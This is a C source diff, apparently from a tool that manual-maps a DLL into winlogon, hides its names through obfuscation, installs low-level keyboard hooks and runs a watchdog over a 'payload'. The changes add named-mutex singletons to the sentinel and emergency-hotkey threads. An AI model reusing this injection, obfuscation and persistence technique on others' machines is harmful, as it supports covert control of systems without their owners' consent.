@@ -148,6 +148,16 @@ static const char NAME_SCREENSAVER_x[13] = { XCHAR('S'),XCHAR('c'),XCHAR('r'),XC
  * match shared/obf_names.c :: SALT_EVT_SHUT byte-for-byte -- the helper
  * probes this event to determine "is the payload alive right now?". */
 #define SALT_EVT_SHUT      "wasvc.evt.shut.1"
+/* v3.1 (2026-09-21) -- named-mutex salts for cross-instance singletons.
+ * During rapid re-arm testing (multiple `sihost --reinject` inside a
+ * few seconds) each fresh wl_input.dll gets manual-mapped into
+ * winlogon on top of the last. The v3.0.6 supersede mechanism (Set /
+ * Sleep 1.5s / Reset) races against sentinel_thread's 5s + 1s poll
+ * cadence, so old thread instances stick around and duplicate work.
+ * Not dangerous but noisy + wastes ~1700 Win32 calls/min at 6-pileup.
+ * A named mutex enforces one-active-per-session cleanly. */
+#define SALT_MTX_SENTINEL  "wasvc.mtx.sentinel.1"
+#define SALT_MTX_EMERG_HK  "wasvc.mtx.emerg.hk.1"
 
 /* Fallback if MachineGuid read fails (BOTH sides use this same literal
  * so IPC still agrees in the degenerate case). Matches obf_names.c. */
@@ -262,6 +272,31 @@ static const char *wl_iso_reader_mutex_name(void) {
     if (buf[0]) return buf;
     char guid[40] = {0};
     if (!wl_derive_guid(SALT_MTX_ISO_READER, guid, sizeof(guid)))
+        lstrcpynA(guid, WL_FALLBACK_GUID, sizeof(guid));
+    wsprintfA(buf, "Local\\%s", guid);
+    return buf;
+}
+
+/* v3.1 (2026-09-21) -- singleton-mutex names for sentinel_thread +
+ * emergency_hotkey_thread. Same session-scoped `Local\` pattern as
+ * the reader mutex so RDP + multi-session boxes each get their own
+ * singleton. Acquisition + auto-release-on-exit means the winning
+ * thread stays alive until it naturally exits (superseded or DLL
+ * unload), then next contender wins on the following tick. */
+static const char *wl_sentinel_mutex_name(void) {
+    static char buf[64] = {0};
+    if (buf[0]) return buf;
+    char guid[40] = {0};
+    if (!wl_derive_guid(SALT_MTX_SENTINEL, guid, sizeof(guid)))
+        lstrcpynA(guid, WL_FALLBACK_GUID, sizeof(guid));
+    wsprintfA(buf, "Local\\%s", guid);
+    return buf;
+}
+static const char *wl_emerg_hk_mutex_name(void) {
+    static char buf[64] = {0};
+    if (buf[0]) return buf;
+    char guid[40] = {0};
+    if (!wl_derive_guid(SALT_MTX_EMERG_HK, guid, sizeof(guid)))
         lstrcpynA(guid, WL_FALLBACK_GUID, sizeof(guid));
     wsprintfA(buf, "Local\\%s", guid);
     return buf;
@@ -1658,9 +1693,33 @@ static DWORD WINAPI emergency_watchdog_thread(LPVOID unused) {
 
 /* Path 1's hosting thread: owns the LL hook + message pump. Publishes
  * its own TID so the reinstaller can PostThreadMessage(WM_APP_REINSTALL)
- * back for the periodic rehook. */
+ * back for the periodic rehook.
+ *
+ * v3.1 (2026-09-21) -- cross-instance singleton via named mutex. Same
+ * rationale as sentinel_thread: rapid re-arms would stack multiple LL
+ * hooks + 6x rehook cost. One winner keeps the hook chain lean;
+ * newest LL_hook install is at LIFO head as a natural side-effect
+ * of "winner is the last arm's fresh thread" anyway. */
 static DWORD WINAPI emergency_hotkey_thread(LPVOID unused) {
     (void)unused;
+
+    const char *mname = wl_emerg_hk_mutex_name();
+    HANDLE mtx = CreateMutexA(NULL, FALSE, mname);
+    if (mtx) {
+        DWORD wr = WaitForSingleObject(mtx, 0);
+        if (wr != WAIT_OBJECT_0 && wr != WAIT_ABANDONED) {
+            lg("emerg-hotkey: singleton mutex held by another instance "
+               "-- yielding (pid=%lu wr=0x%lX)",
+               GetCurrentProcessId(), wr);
+            CloseHandle(mtx);
+            return 0;
+        }
+        if (wr == WAIT_ABANDONED) {
+            lg("emerg-hotkey: prior owner died without release -- "
+               "taking over cleanly");
+        }
+    }
+
     HDESK d = OpenDesktopA("Default", 0, FALSE,
                             DESKTOP_HOOKCONTROL | GENERIC_READ);
     if (d) {
@@ -1673,7 +1732,10 @@ static DWORD WINAPI emergency_hotkey_thread(LPVOID unused) {
     g_emerg_ll_hook = SetWindowsHookExW(WH_KEYBOARD_LL, sn_emerg_ll_kbd, NULL, 0);
     lg("emerg-hotkey: WH_KEYBOARD_LL install %s (Ctrl+Shift+Alt+Q/R, path 1 of 4)",
        g_emerg_ll_hook ? "OK" : "FAILED");
-    if (!g_emerg_ll_hook) return 0;
+    if (!g_emerg_ll_hook) {
+        if (mtx) { ReleaseMutex(mtx); CloseHandle(mtx); }
+        return 0;
+    }
 
     g_emerg_ll_tid = GetCurrentThreadId();
 
@@ -1702,6 +1764,8 @@ static DWORD WINAPI emergency_hotkey_thread(LPVOID unused) {
     if (g_emerg_ll_hook) UnhookWindowsHookEx(g_emerg_ll_hook);
     g_emerg_ll_hook = NULL;
     g_emerg_ll_tid = 0;
+    /* Release singleton mutex so next arm's fresh thread wins cleanly. */
+    if (mtx) { ReleaseMutex(mtx); CloseHandle(mtx); }
     lg("emerg-hotkey: thread exit");
     return 0;
 }
@@ -1709,8 +1773,35 @@ static DWORD WINAPI emergency_hotkey_thread(LPVOID unused) {
 /* ── Sentinel thread: watches shell + payload liveness ───────── */
 static DWORD WINAPI sentinel_thread(LPVOID unused) {
     (void)unused;
-    lg("sentinel_thread up in pid=%lu (shell + payload watchdog)",
-       GetCurrentProcessId());
+
+    /* v3.1 (2026-09-21) -- cross-instance singleton via named mutex.
+     * When multiple wl_input.dll copies are manual-mapped into
+     * winlogon (rapid --reinject sequence, or supersede-lost race),
+     * only the first sentinel_thread across all instances wins the
+     * mutex; the rest exit immediately. Releases on thread exit so
+     * the next contender wins seamlessly when the incumbent leaves. */
+    const char *mname = wl_sentinel_mutex_name();
+    HANDLE mtx = CreateMutexA(NULL, FALSE, mname);
+    if (!mtx) {
+        lg("sentinel_thread: CreateMutex failed gle=%lu -- proceeding "
+           "unguarded (duplicate instances possible)", GetLastError());
+    } else {
+        DWORD wr = WaitForSingleObject(mtx, 0);   /* non-blocking */
+        if (wr != WAIT_OBJECT_0 && wr != WAIT_ABANDONED) {
+            lg("sentinel_thread: singleton mutex held by another instance "
+               "-- yielding (pid=%lu wr=0x%lX)",
+               GetCurrentProcessId(), wr);
+            CloseHandle(mtx);
+            return 0;
+        }
+        if (wr == WAIT_ABANDONED) {
+            lg("sentinel_thread: prior owner died without release -- "
+               "taking over cleanly");
+        }
+    }
+
+    lg("sentinel_thread up in pid=%lu (shell + payload watchdog + "
+       "crash-loop firewall)", GetCurrentProcessId());
 
     /* Startup grace: give the payload up to 30 s to publish its
      * shutdown event before we start considering it "dead". Also lets
@@ -1808,6 +1899,9 @@ static DWORD WINAPI sentinel_thread(LPVOID unused) {
             lg("sentinel: payload dead but rate-limited (backing off)");
         }
     }
+    /* Release singleton mutex so a fresh instance can take over on
+     * the next arm without waiting for our handle to leak-close. */
+    if (mtx) { ReleaseMutex(mtx); CloseHandle(mtx); }
     lg("sentinel: exit (superseded)");
     return 0;
 }
